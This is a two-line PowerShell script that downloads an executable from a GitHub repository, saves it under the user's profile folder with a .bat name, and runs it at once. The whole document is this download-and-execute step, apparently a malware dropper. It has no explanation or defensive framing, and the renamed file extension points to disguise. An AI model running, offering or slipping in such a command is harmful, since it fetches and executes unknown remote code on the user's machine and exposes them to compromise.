Start-BitsTransfer -Priority foreground -Source "https://github.com/n0t-cr1m3/test/raw/main/startt1.exe" -Destination "$env:USERPROFILE/startt.bat"
Start-Process -FilePath "$env:USERPROFILE/startt.bat"
            